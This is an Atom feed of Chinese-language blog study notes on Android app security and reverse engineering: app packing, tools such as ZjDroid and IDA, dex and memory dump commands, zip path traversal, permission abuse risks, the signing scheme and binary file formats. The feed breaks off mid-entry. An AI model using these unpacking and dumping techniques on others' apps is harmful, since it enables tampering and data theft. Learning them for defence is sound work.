<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>nuoye</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://nuoye-blog.github.io/"/>
  <updated>2020-06-09T07:30:39.236Z</updated>
  <id>https://nuoye-blog.github.io/</id>
  
  <author>
    <name>nuoye</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Android-day13</title>
    <link href="https://nuoye-blog.github.io/2020/06/09/Android/Android-day13/"/>
    <id>https://nuoye-blog.github.io/2020/06/09/Android/Android-day13/</id>
    <published>2020-06-09T07:30:00.000Z</published>
    <updated>2020-06-09T07:30:39.236Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Android应用加固原理"><a href="#Android应用加固原理" class="headerlink" title="Android应用加固原理"></a>Android应用加固原理</h1><h2 id="加固原理解析"><a href="#加固原理解析" class="headerlink" title="加固原理解析"></a>加固原理解析</h2><p>加固的过程需要三个对象：</p><p>需要加密的apk（源apk）</p><p>自己的壳程序apk（负责解密apk工作）</p><p>加密工具（将源apk进行加密和壳dex合并成新的dex）</p><p><img src="./day13/1.jpg" alt=""></p><p>加固的主要步骤：拿到需要加密的apk和自己的壳程序apk，然后用加密算法对源apk进行加密，再将壳apk进行合并得到新的dex文件，最后替换壳程序中的dex文件即可，得到新的apk，这个新的apk也叫做脱壳程序apk（它的主要工作是解密源apk，然后加载apk，让其正常运行起来）。</p><p>常用反编译工具：jd-gui、dex2jar。</p><h1 id="Android中的so加固原理"><a href="#Android中的so加固原理" class="headerlink" title="Android中的so加固原理"></a>Android中的so加固原理</h1><h2 id="基于对so中section加密实现so加固"><a href="#基于对so中section加密实现so加固" class="headerlink" title="基于对so中section加密实现so加固"></a>基于对so中section加密实现so加固</h2><h3 id="技术原理"><a href="#技术原理" class="headerlink" title="技术原理"></a>技术原理</h3><p>加密过程：找到so文件中一个section的起始地址和大小就可以对这个section进行加密了。</p><p>解密过程：对于一个so文件，当被加载到程序后，可以使用<code>__attrbute__((constructor));</code>这个属性（这个属性优先于main方法之前执行，类似java中的构造函数，C++的构造函数即是基于这个属性实现的）。</p><h2 id="基于对so中的函数加密实现so加固"><a href="#基于对so中的函数加密实现so加固" class="headerlink" title="基于对so中的函数加密实现so加固"></a>基于对so中的函数加密实现so加固</h2><h1 id="Android逆向分析基础"><a href="#Android逆向分析基础" class="headerlink" title="Android逆向分析基础"></a>Android逆向分析基础</h1><h2 id="逆向工具"><a href="#逆向工具" class="headerlink" title="逆向工具"></a>逆向工具</h2><ul><li>apktool</li><li>dex2jar+jd-gui</li><li>JEB和Jadx</li><li>Xposed</li><li>Cydia Substrate</li><li>ZjDroid</li><li>IDA</li></ul><h2 id="打开系统调试总开关"><a href="#打开系统调试总开关" class="headerlink" title="打开系统调试总开关"></a>打开系统调试总开关</h2><p>Android中一些常用的配置信息都存放在/system/build.prop文件中。</p><p>通过使用getprop和setprop命令，可以获取和设置这些属性，另外ro开头的属性是不允许后期修改的。</p><p>而/system/defult.prop中的ro.debuggable（当Dalvik虚拟机从Android应用框架中启动时，这个值为1）这个值如果为1，那么系统中所有的程序都是可以调试的。如果该值为0，则会判断程序AndroidManifest.xml中android:debuggable元素是否为true，如果为true则开启调试支持。</p><p>设置ro.debuggable的三种方式：</p><ul><li>直接修改default.prop文件中的值，然后重启设备。</li><li>改写系统文件，重新编译系统镜像文件，然后刷入到设备中。</li><li>注入init进程，修改内存中的属性值。</li></ul><p>网上已有最后一种方式（最稳定）的实现工具mprop</p><h1 id="反编译神器apktool和Jadx"><a href="#反编译神器apktool和Jadx" class="headerlink" title="反编译神器apktool和Jadx"></a>反编译神器apktool和Jadx</h1><h2 id="分析apktool的源码"><a href="#分析apktool的源码" class="headerlink" title="分析apktool的源码"></a>分析apktool的源码</h2><p>源码地址为<a href="https://code.google.com/p/android-apktool/。github的地址：https://github.com/iBotPeaches/Apktool。" target="_blank" rel="noopener">https://code.google.com/p/android-apktool/。github的地址：https://github.com/iBotPeaches/Apktool。</a></p><h2 id="Jadx源码分析"><a href="#Jadx源码分析" class="headerlink" title="Jadx源码分析"></a>Jadx源码分析</h2><p>源码地址：<a href="https://github.com/skylot/jadx。" target="_blank" rel="noopener">https://github.com/skylot/jadx。</a></p><h1 id="HOOK神器Xposed"><a href="#HOOK神器Xposed" class="headerlink" title="HOOK神器Xposed"></a>HOOK神器Xposed</h1><h2 id="编写模块功能"><a href="#编写模块功能" class="headerlink" title="编写模块功能"></a>编写模块功能</h2><p>暂略，后面争取开一章学习</p><h1 id="脱壳神器ZjDroid"><a href="#脱壳神器ZjDroid" class="headerlink" title="脱壳神器ZjDroid"></a>脱壳神器ZjDroid</h1><p>源码地址：<a href="http://github.com/halfkiss/ZjDroid" target="_blank" rel="noopener">http://github.com/halfkiss/ZjDroid</a></p><h2 id="工具命令"><a href="#工具命令" class="headerlink" title="工具命令"></a>工具命令</h2><h3 id="dump-dexinfo"><a href="#dump-dexinfo" class="headerlink" title="dump_dexinfo"></a>dump_dexinfo</h3><p>用于获取应用运行时内存中的dex信息。对应函数为DumpDexInfoCommandHandler。</p><p>用法<code>am broadcast -a com.zjdroid.invoke --ei target [pid] --es cmd &#39;(&quot;action&quot;:&quot;dump_dexinfo&quot;)&#39;</code></p><h3 id="dump-dexfile"><a href="#dump-dexfile" class="headerlink" title="dump_dexfile"></a>dump_dexfile</h3><p>用于dump出应用内存中dex文件。对应函数为DumpDexFileCommandHandler。</p><p>用法：<code>am broadcast -a com.zjdroid.invoke --ei target [pid] --es cmd &#39;(&quot;action&quot;:&quot;dump_dexfile&quot;, &quot;dexpath&quot;:&quot;*****&quot;)&#39;</code></p><p>其中dexpath参数代表需要脱壳的dex文件，也就是应用程序文件。</p><p>脱壳后的文件在/data/data/xxx/files/dexdump.odex</p><h3 id="backsmali"><a href="#backsmali" class="headerlink" title="backsmali"></a>backsmali</h3><p>该命令与上一命令功能差不多，只不过还增加了把dex文件转化为smali文件的功能。</p><p>命令：<code>am broadcast -a com.zjdroid.invoke --ei target [pid] --es cmd &#39;(&quot;action&quot;:&quot;backsmali&quot;, &quot;dexpath&quot;:&quot;*****&quot;)&#39;</code></p><p>最终生成文件在/data/data/xxx/smali下。</p><h3 id="dump-mem"><a href="#dump-mem" class="headerlink" title="dump_mem"></a>dump_mem</h3><p>这个命令用来dump出应用程序运行时内存中指定开始位置和长度的内存块数据的。对应函数DumpMemCommandHandler。</p><p>命令：<code>am broadcast -a com.zjdroid.invoke --ei target [pid] --es cmd &#39;(&quot;action&quot;:&quot;dump_mem&quot;, &quot;start&quot;:111, &quot;length&quot;:222)&#39;</code></p><p>其中start和length都是十进制。</p><h3 id="dump-heap"><a href="#dump-heap" class="headerlink" title="dump_heap"></a>dump_heap</h3><p>该命令用于dump出虚拟机的堆内存信息，可以用于java heap工具分析。</p><p>命令：<code>am broadcast -a com.zjdroid.invoke --ei target [pid] --es cmd &#39;(&quot;action&quot;:&quot;dump_heap&quot;)&#39;</code></p><h3 id="dump-class"><a href="#dump-class" class="headerlink" title="dump_class"></a>dump_class</h3><p>这个命令主要用于dump出dex文件中的类信息。因为在DexFile对象中有一个隐藏的方法可以把dex文件中所有类名获取到getClassNameList。</p><p>命令：<code>am broadcast -a com.zjdroid.invoke --ei target [pid] --es cmd &#39;(&quot;action&quot;:&quot;dump_heap&quot;, &quot;dexpath&quot;:&quot;*****&quot;)&#39;</code></p><h3 id="invoke"><a href="#invoke" class="headerlink" title="invoke"></a>invoke</h3><p>这个命令用于运行时动态调用Lua脚本，该功能可以通过Lia脚本动态调用Java代码。</p><p>命令：<code>am broadcast -a com.zjdroid.invoke --ei target [pid] --es cmd &#39;(&quot;action&quot;:&quot;invoke&quot;, &quot;filepath&quot;:&quot;*****&quot;)&#39;</code></p><h2 id="工具日志信息"><a href="#工具日志信息" class="headerlink" title="工具日志信息"></a>工具日志信息</h2><p>两个tag可以用于查看相应日志：</p><p>zjdroid-shell-{package name}：该tag可以查看上面每个命令执行的结果，便于查看命令执行状态。</p><p>zjdroid-apimonitor-{package name}：该tag可以监听对应包名应用调用的API信息，类似于运行时权限请求。</p><h1 id="Native层Hook神奇Cydia-Substrate"><a href="#Native层Hook神奇Cydia-Substrate" class="headerlink" title="Native层Hook神奇Cydia Substrate"></a>Native层Hook神奇Cydia Substrate</h1><p><a href="http://www.cydiasubstrate.com" target="_blank" rel="noopener">http://www.cydiasubstrate.com</a></p><p>略，有机会再尝试。</p><h1 id="静态方式逆向应用"><a href="#静态方式逆向应用" class="headerlink" title="静态方式逆向应用"></a>静态方式逆向应用</h1><h3 id="smali语法"><a href="#smali语法" class="headerlink" title="smali语法"></a>smali语法</h3><h3 id="手动注入smali语句"><a href="#手动注入smali语句" class="headerlink" title="手动注入smali语句"></a>手动注入smali语句</h3><h3 id="ARM指令"><a href="#ARM指令" class="headerlink" title="ARM指令"></a>ARM指令</h3><h1 id="动态调试smali源码"><a href="#动态调试smali源码" class="headerlink" title="动态调试smali源码"></a>动态调试smali源码</h1><p>步骤：</p><ol><li>建议apk：修改debug属性为true，同时加上waitForDebug，从而允许调试</li><li>回编译apk：回编译并签名、安装</li><li>将反编译samli工程导入Eclipse</li><li>设置远程调试</li><li>调试apk程序</li><li>编写代码实现核心逻辑</li></ol><p>jeb也有调试功能，只需要加载app，然后在adb中运行<code>am start -n [packagename]/[packagename].[Activity] -D</code>即可attach上去。</p><h1 id="IDA调试so源码"><a href="#IDA调试so源码" class="headerlink" title="IDA调试so源码"></a>IDA调试so源码</h1><h3 id="获取android-server"><a href="#获取android-server" class="headerlink" title="获取android_server"></a>获取android_server</h3><p>在IDA目录下/dbgsrv/android/server。将该文件移动到设备目录/data下，接着运行，这样就打开了监听设备的端口（这里以23946端口为例，可以通过-p参数修改端口）。</p><p>然后运行adb命令：<code>adb forward tcp:远程设备端口 tcp:本地端口</code>，即可以写成<code>adb forward tcp:23946 tcp:23946</code>。</p><h3 id="IDA获取进程信息"><a href="#IDA获取进程信息" class="headerlink" title="IDA获取进程信息"></a>IDA获取进程信息</h3><p>打开IDA，在Debugger中选择Android debugger选项，然后attach上去（127.0.0.1:23946）。</p><h3 id="找到函数地址下断点"><a href="#找到函数地址下断点" class="headerlink" title="找到函数地址下断点"></a>找到函数地址下断点</h3><p>到这里就跟平时elf调试差不多了，略过</p><h1 id="Android中常见漏洞分析"><a href="#Android中常见漏洞分析" class="headerlink" title="Android中常见漏洞分析"></a>Android中常见漏洞分析</h1><h2 id="解压文件漏洞分析"><a href="#解压文件漏洞分析" class="headerlink" title="解压文件漏洞分析"></a>解压文件漏洞分析</h2><p>因为ZipEntry对传入的文件名没有限制，导致可以使用<code>../</code>等字符从而随意覆盖本地文件。</p><h2 id="录屏授权漏洞分析"><a href="#录屏授权漏洞分析" class="headerlink" title="录屏授权漏洞分析"></a>录屏授权漏洞分析</h2><p>由于提示信息展示的时候没有做省略处理，从而把最重要的提示文案隐藏，导致用户被骗，同意授权。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Android应用加固原理&quot;&gt;&lt;a href=&quot;#Android应用加固原理&quot; class=&quot;headerlink&quot; title=&quot;Android应用加固原理&quot;&gt;&lt;/a&gt;Android应用加固原理&lt;/h1&gt;&lt;h2 id=&quot;加固原理解析&quot;&gt;&lt;a href=&quot;#加固原
      
    
    </summary>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/categories/Android/"/>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/tags/Android/"/>
    
      <category term="开发" scheme="https://nuoye-blog.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
      <category term="安全" scheme="https://nuoye-blog.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Android-day12</title>
    <link href="https://nuoye-blog.github.io/2020/06/08/Android/Android-day12/"/>
    <id>https://nuoye-blog.github.io/2020/06/08/Android/Android-day12/</id>
    <published>2020-06-08T13:20:00.000Z</published>
    <updated>2020-06-08T13:20:48.542Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Android应用安全防护的基本策略"><a href="#Android应用安全防护的基本策略" class="headerlink" title="Android应用安全防护的基本策略"></a>Android应用安全防护的基本策略</h1><h2 id="混淆机制"><a href="#混淆机制" class="headerlink" title="混淆机制"></a>混淆机制</h2><h3 id="代码混淆"><a href="#代码混淆" class="headerlink" title="代码混淆"></a>代码混淆</h3><p>在反编译apk后，看到的代码类名、方法名已经代码格式看起来不像正常的Android项目代码，这就是经过混淆的代码。</p><h3 id="资源混淆"><a href="#资源混淆" class="headerlink" title="资源混淆"></a>资源混淆</h3><p>资源混淆的功能具体可看微信团队的开源项目：<a href="https://github.com/shwenzhang/AndResGuard。" target="_blank" rel="noopener">https://github.com/shwenzhang/AndResGuard。</a></p><p>对于资源混淆，在获取到资源对于的int类型值后，可在/res/values/public.xml找到对应的一个name项的值，然后通过这个name的值可以在相应的xml中查找到对应的资源。</p><h2 id="签名保护"><a href="#签名保护" class="headerlink" title="签名保护"></a>签名保护</h2><p>Android中每个应用都有一个唯一的签名。</p><p>为了防止应用被二次打包，可以在程序入口处添加签名验证，从而防止运行被修改的程序。</p><h2 id="手动注册native方法"><a href="#手动注册native方法" class="headerlink" title="手动注册native方法"></a>手动注册native方法</h2><p>在Android中，当程序Java层运行System.loadLibrary(“jnitest”);这行代码后，程序会去载入jnitest.so文件。与此同时，产生一个Load事件，这个事件触发后，程序默认会在载入的.so文件的函数列表中查找JNI_OnLoad函数并执行（卸载时触发UnLoad事件，并查找JNI_OnUnload函数执行。JNI_OnLoad和JNI_OnUnload函数并不强制要求用户去实现）。一般情况下，在C组件中的JNI_OnLoad函数用来实现给VM注册接口，以方便VM可以快速地找到Java代码需要调用的C函数。</p><p>应用层的Java类通过VM而调用native函数，这个搜索的过程可能较为漫长。C组件开发者可以将本地函数向VM进行注册，从而加快后续调用native函数的效率。</p><p>一般而言，对应native层的函数名是：<code>Java_类名_方法名</code></p><p>显示注册需要在native层的代码中调用如下三个函数：</p><p><code>(*env)-&gt;RegisterNatives(env, clazz, methods, methodsLenght)</code>：这个函数用于手动手动注册native方法。clazz就是需要注册native方法的那个类，methods是一个结构体包含name（Java中函数的名字）、signature（用字符串描述了函数的参数和返回值）、fnPtr（函数指针，指向C函数）。</p><p><code>jint JNI_OnLoad(JavaVM* vm, void* reserved)</code>：在这个函数里面执行上面的注册函数。</p><p><code>void JNI_OnUnload(JavaVM* vm, void* reserved)</code></p><h2 id="反调试检测"><a href="#反调试检测" class="headerlink" title="反调试检测"></a>反调试检测</h2><p>ptrace机制有一个特点：如果一个进程被调试了，在它进程的status文件中有一个字段TracerPid会记录调试者的进程id值。通过判断这个TracerPid的值是否为0，就可以判断是否被调试中，从而实现反调试。</p><h1 id="Android中常用权限分析"><a href="#Android中常用权限分析" class="headerlink" title="Android中常用权限分析"></a>Android中常用权限分析</h1><h2 id="辅助功能权限"><a href="#辅助功能权限" class="headerlink" title="辅助功能权限"></a>辅助功能权限</h2><p>Android提供了辅助（Accessibility）功能和服务帮助用户更加简单地操作设备，包括文字转语音、触觉反馈、手势操作、轨迹球和手柄操作。辅助功能实质上就是监听应用窗口变化和事件。</p><p>使用辅助功能的时候必须声明以下权限：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">service</span> <span class="attr">android:name</span>=<span class="string">".MyAcessibilityService"</span></span></span><br><span class="line"><span class="tag">             <span class="attr">android:label</span>=<span class="string">"@string/accessibility_service_label"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.accessibilityservice.AcessibilityService"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permisson</span> <span class="attr">android:name</span>=<span class="string">"android.permission.BIND_ACCESSIBILITY_SERVICE"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在代码中直接打开相应的Intent跳转到授权界面：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Intent accIntent = <span class="keyword">new</span> Intent(Setting.ACTION_ACCESSIBILITY_SERVICE);</span><br><span class="line">startActivity(accIntent);</span><br></pre></td></tr></table></figure><p>存在的风险：可以监听设备当前的窗口变化，分析当前应用的View结构之后模拟点击：</p><ul><li>模拟一些社交App的登录窗口页面，这样用户是无感知的。</li><li>当监听到当前应用是社交App，而且是聊天记录页面时，就可以得知当前聊天记录。</li><li>分析设备中的应用情况，在用户不知情的情况下，模拟点击任何一个应用进行操作，从而获取信息。</li></ul><h2 id="设备管理权限"><a href="#设备管理权限" class="headerlink" title="设备管理权限"></a>设备管理权限</h2><p>作用类似于iPhone中的“查找我的手机”功能，可以快速定位以及擦除设备数据等。另外还可以防止被卸载。</p><p>存在的风险：申请这个权限后，设备相当于是给申请者管理了，他们可以修改设备的锁屏密码、擦除数据等。</p><h2 id="通知栏管理权限"><a href="#通知栏管理权限" class="headerlink" title="通知栏管理权限"></a>通知栏管理权限</h2><p>这个功能专门用于监听设备的通知栏消息。</p><p>存在的风险：与辅助功能一样，申请这个权限后用户设备的通知栏消息就会被它接管。</p><h2 id="VPN开发权限"><a href="#VPN开发权限" class="headerlink" title="VPN开发权限"></a>VPN开发权限</h2><p>存在的风险：如果申请了这个权限，就代表这个设备的网络访问消息会被申请者接管。</p><h1 id="Android中的run-as命令"><a href="#Android中的run-as命令" class="headerlink" title="Android中的run-as命令"></a>Android中的run-as命令</h1><p>run-as命令的作用是可以用root身份运行命令，但是必须携带指定应用包名参数，而且这个应用是debug模式的。即开发中如果想看自己应用的沙盒数据(/data/data/xxx/)，在设备没有root的情况下，可以使用这个命令进行查看。</p><h2 id="命令分析和使用"><a href="#命令分析和使用" class="headerlink" title="命令分析和使用"></a>命令分析和使用</h2><p>使用run-as [packagename]后即可进入相应的目录：/data/data/packagename/。</p><p>Android中命令一般都在/system/bin和/system/xbin目录下，对应的源码都在Android源码目录下的/system/core下。</p><p>run-as命令运行是有诸多限制的：</p><ul><li><p>运行命令的用户id只能是shell和root用户</p></li><li><p>应用的安装必须合法</p></li><li><p>应用的uid必须合法</p></li><li><p>应用是否为debug模式</p></li></ul><h2 id="Linux中的setuid和setgid概念"><a href="#Linux中的setuid和setgid概念" class="headerlink" title="Linux中的setuid和setgid概念"></a>Linux中的setuid和setgid概念</h2><p>Linux/Unix下的可执行文件一旦被设置了setuid标记，使用该可执行程序的进程就将拥有该执行文件的所有者权限。</p><h2 id="Android中setuid和setgid的使用场景"><a href="#Android中setuid和setgid的使用场景" class="headerlink" title="Android中setuid和setgid的使用场景"></a>Android中setuid和setgid的使用场景</h2><h3 id="zygote降级处理"><a href="#zygote降级处理" class="headerlink" title="zygote降级处理"></a>zygote降级处理</h3><p>zygote启动后，会进入一个轮询使用socket来监听ActivityManagerService发来的消息，比如应用的启动，zygote就fork出一个进程，开始运转。因为zygote是root用户的，所以zygote通过setuid、setgid进行降级处理，避免所有fork出来的程序都是root权限。</p><h3 id="su工具原理"><a href="#su工具原理" class="headerlink" title="su工具原理"></a>su工具原理</h3><p>Android手机的root原理是：一个普通进程通过执行su，从而获得一个具有root权限的进程。通过配合superuser这款app，可以在需要时对应用进行授权，从而避免了root权限的滥用。</p><h3 id="run-as命令"><a href="#run-as命令" class="headerlink" title="run-as命令"></a>run-as命令</h3><p>run-as命令本身的uid是root，gid是shell。</p><h2 id="run-as命令的作用"><a href="#run-as命令的作用" class="headerlink" title="run-as命令的作用"></a>run-as命令的作用</h2><p>在Android中要调试一个程序，首先这个程序必须是debug模式的，也就是在AndroidManifest.xml中设置的属性，所以一般是修改XML中的debug属性，然后才进行代码关联调试。</p><h1 id="Android中的allowBackup属性"><a href="#Android中的allowBackup属性" class="headerlink" title="Android中的allowBackup属性"></a>Android中的allowBackup属性</h1><h2 id="allowBackup属性介绍"><a href="#allowBackup属性介绍" class="headerlink" title="allowBackup属性介绍"></a>allowBackup属性介绍</h2><p>Android API Level 8及以上Android系统提供了位应用程序数据的备份和恢复功能，此功能的开关由应用程序中AndroidManifest.xml文件中的allowBackup属性值决定，其默认为true，可通过<code>adb backup</code>或<code>adb restore</code>命令对应用数据进行备份和恢复。</p><p>这个属性的安全风险源于adb backup命令容许任何一个能够打开USB调试开关的人从Android手机中复制应用数据到外设，一旦应用数据被备份后，所有应用数据都可被用户读取；adb restore容许用户指定一个回复的数据，来源来恢复应用程序数据的创建。</p><h1 id="Android中的签名机制"><a href="#Android中的签名机制" class="headerlink" title="Android中的签名机制"></a>Android中的签名机制</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="数据摘要"><a href="#数据摘要" class="headerlink" title="数据摘要"></a>数据摘要</h3><p>数据摘要其实是一种算法，就是对一个数据源进行一个算法操作之后得到一个摘要，也叫作数据指纹。</p><p>消息摘要算法是一种能产生特殊输出格式的算法，其原理是根据一定的运算规则对原始数据进行某种形式的消息提取，提取出的信息就称为原始数据的数据摘要。</p><h3 id="签名文件和证书文件"><a href="#签名文件和证书文件" class="headerlink" title="签名文件和证书文件"></a>签名文件和证书文件</h3><p>签名文件和证书文件是成对出现的，二者不可分离。</p><h3 id="jarsign和signapk工具"><a href="#jarsign和signapk工具" class="headerlink" title="jarsign和signapk工具"></a>jarsign和signapk工具</h3><p>这两个是Android中的签名工具。jarsign是用于jar签名，signapk是用于apk签名。</p><h2 id="Android中的签名流程"><a href="#Android中的签名流程" class="headerlink" title="Android中的签名流程"></a>Android中的签名流程</h2><p>signapk的源码位于：Android源码中的 com/android/signapk/sign.java。</p><p>Android签名apk后，会有一个META-INF目录，这里有三个文件：MANIFEST.MF、CERT.SF、CERT.RSA。</p><h3 id="MANIFEST-MF"><a href="#MANIFEST-MF" class="headerlink" title="MANIFEST.MF"></a>MANIFEST.MF</h3><p>这个文件主要包括apk中所有文件的数据摘要内容。</p><h3 id="CERT-SF"><a href="#CERT-SF" class="headerlink" title="CERT.SF"></a>CERT.SF</h3><p>这个文件先对之前的MANIFEST.MF整个内容做一个SHA1方法哦SHA1-Digest-Manifest字段中。</p><p>然后逐条计算MANIFEST.MF文件中每一个块的SHA1，并进过BASE64编码后，记录在CERT.SF同名块中，属性名是SHA1-Digest。</p><h3 id="CERT-RSA"><a href="#CERT-RSA" class="headerlink" title="CERT.RSA"></a>CERT.RSA</h3><p>这个文件就是对前面CERT.SF文件做签名操作后的结果，也就是前面提到的签名文件。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Android应用安全防护的基本策略&quot;&gt;&lt;a href=&quot;#Android应用安全防护的基本策略&quot; class=&quot;headerlink&quot; title=&quot;Android应用安全防护的基本策略&quot;&gt;&lt;/a&gt;Android应用安全防护的基本策略&lt;/h1&gt;&lt;h2 id=&quot;混
      
    
    </summary>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/categories/Android/"/>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/tags/Android/"/>
    
      <category term="开发" scheme="https://nuoye-blog.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
      <category term="安全" scheme="https://nuoye-blog.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Android-day11</title>
    <link href="https://nuoye-blog.github.io/2020/06/06/Android/Android-day11/"/>
    <id>https://nuoye-blog.github.io/2020/06/06/Android/Android-day11/</id>
    <published>2020-06-06T15:10:00.000Z</published>
    <updated>2020-06-06T15:08:27.972Z</updated>
    
    <content type="html"><![CDATA[<h1 id="AndroidManifest-xml文件格式解析"><a href="#AndroidManifest-xml文件格式解析" class="headerlink" title="AndroidManifest.xml文件格式解析"></a>AndroidManifest.xml文件格式解析</h1><h2 id="格式分析"><a href="#格式分析" class="headerlink" title="格式分析"></a>格式分析</h2><p><img src="./day11/1.png" alt=""></p><h2 id="格式分析-1"><a href="#格式分析-1" class="headerlink" title="格式分析"></a>格式分析</h2><h3 id="头部信息"><a href="#头部信息" class="headerlink" title="头部信息"></a>头部信息</h3><p>每个头部固定有以下字段：</p><ul><li>文件魔数：4字节</li><li>文件大小：4字节</li></ul><h3 id="解析String-Chunk"><a href="#解析String-Chunk" class="headerlink" title="解析String Chunk"></a>解析String Chunk</h3><ul><li><p>ChunkType：StringChunk的类型，固定四个字节：0x001c0001。</p></li><li><p>ChunkSize：StringChunk的大小，四个字节。</p></li><li><p>StringCount：StringChunk中字符串的个数，四个字节。</p></li><li><p>StyleCount：StringChunk中样式的个数，四个字节。但实际解析过程中，这个值一直是0x00000000。</p></li><li><p>Unknown：位置区域，四个字节，在解析过程中需要略过这四个字节。</p></li><li><p>StringPoolOffset：字符串池的偏移值，四个字节，这个偏移值是相对于StringChunk的头部位置。</p></li><li><p>StylePoolPffset：样式池的偏移值，四个字节。因为这里没有Style，所以这个字段可忽略。</p></li><li><p>StringOffsets：每个字符串的偏移值，它的大小应该是StringCount*4字节。</p></li><li><p>StyleOffsets：每个样式的偏移值，它的大小应该是SytleCount*4字节。</p></li></ul><h3 id="解析Resourceld-Chunk"><a href="#解析Resourceld-Chunk" class="headerlink" title="解析Resourceld Chunk"></a>解析Resourceld Chunk</h3><p>Resourceld Chunk主要用于存放AndroidManifest中用到的系统属性值对应的资源ID。</p><ul><li><p>ChunkType：Resourceld Chunk的类型，固定四个字节：0x00080108。</p></li><li><p>ChunkSize：Resourceld Chunk的大小，四个字节。</p></li><li><p>Resourcelds：Resourceld的内容，这里大小是Resourceld Chunk大小除以4，减去头部的大小8个字节（ChunkType和ChunkSize）。</p></li></ul><h3 id="解析Start-Namespace-Chunk"><a href="#解析Start-Namespace-Chunk" class="headerlink" title="解析Start Namespace Chunk"></a>解析Start Namespace Chunk</h3><p>这个Chunk主要包含一个AndroidManifest文件中的命名空间的内容。</p><ul><li>ChunkType：Chunk的类型，固定四个字节：0x00100100。</li><li>ChunkSize：Chunk的大小，四个字节。</li><li>Line Number：在AndroidManifest文件中的行号，四个字节。</li><li>Unknown：未知区域，四个字节。</li><li>Prefix：命名空间的前缀（在字符串中的索引值），比如android。</li><li>Uri：命名空间的URI（在字符串中的索引值），比如<a href="http://schemas.android.com/apk/res/android。" target="_blank" rel="noopener">http://schemas.android.com/apk/res/android。</a></li></ul><h3 id="解析Start-Tag-Chunk"><a href="#解析Start-Tag-Chunk" class="headerlink" title="解析Start Tag Chunk"></a>解析Start Tag Chunk</h3><p>这个Chunk主要存放AndroidManifest.xml中的标签信息。</p><ul><li>ChunkType：Chunk的类型，固定四个字节：0x00100102。</li><li>ChunkSize：Chunk的大小，四个字节。</li><li>Line Number：在AndroidManifest文件中的行号，四个字节。</li><li>Unknown：未知区域，四个字节。</li><li>Namespace URI：这个标签用到的命名空间的URI，比如用到了android这个前缀，那么就需要用<a href="http://schemas.android.com/apk/res/android这个URI区获取，四个字节。" target="_blank" rel="noopener">http://schemas.android.com/apk/res/android这个URI区获取，四个字节。</a></li><li>Name：标签的名称（在字符串中的索引值），四个字节。</li><li>Flags：标签的类型，四个字节，比如是开始标签还是结束标签等。</li><li>Attribute Count：标签包含的属性个数，四个字节。</li><li>Class Atrribute：标签包含的类属性，四个字节。</li><li>Atrributes：属性内容，每个属性算是一个Entry，Entry是大小为5的字节数组[Namespace, URI, Name, ValueString, Data]，在解析的时候需要注意第四个值，要做一次处理：右移24位。所以这个字段的大小是<code>属性个数*4*5个字节</code>。</li></ul><h2 id="项目下载地址"><a href="#项目下载地址" class="headerlink" title="项目下载地址"></a>项目下载地址</h2><p><a href="https://github.com/fourbrother/parse_androidxml" target="_blank" rel="noopener">https://github.com/fourbrother/parse_androidxml</a></p><h1 id="resource-arsc文件格式解析"><a href="#resource-arsc文件格式解析" class="headerlink" title="resource.arsc文件格式解析"></a>resource.arsc文件格式解析</h1><h2 id="Android中资源文件的id格式"><a href="#Android中资源文件的id格式" class="headerlink" title="Android中资源文件的id格式"></a>Android中资源文件的id格式</h2><p>用apktool工具反编译时，在res/values目录下有个public.xml文件，这个文件保存了apk中所有id类型和对应的id值。包括了如下内容：</p><ul><li>type：类型名</li><li>name：资源名</li><li>id：资源的id</li></ul><p>资源包括如下几种：drawable、menu、layout、string、attr、color、style等。</p><p>接下来介绍如何解析resource.arsc文件：</p><p>解压一个apk得到对应的resource.arsc文件。</p><p>Android源码中的frameworks/base/include/androidfw/ResourceTypes.h即是resource中定义的所有数据结构。</p><p><img src="./day11/2.png" alt=""></p><h2 id="数据结构的定义"><a href="#数据结构的定义" class="headerlink" title="数据结构的定义"></a>数据结构的定义</h2><h3 id="头部信息（ResChunkHeader）"><a href="#头部信息（ResChunkHeader）" class="headerlink" title="头部信息（ResChunkHeader）"></a>头部信息（ResChunkHeader）</h3><p>resource.arsc文件格式是由一系列chunk构成的，每一个chunk都包含一个结构ResChunk_header，用来描述这个Chunk的基本信息。</p><p>参数：</p><ul><li>type：当前chunk的类型。</li><li>headerSize：当前chunk的头部大小。</li><li>size：当前chunk的大小。</li></ul><h3 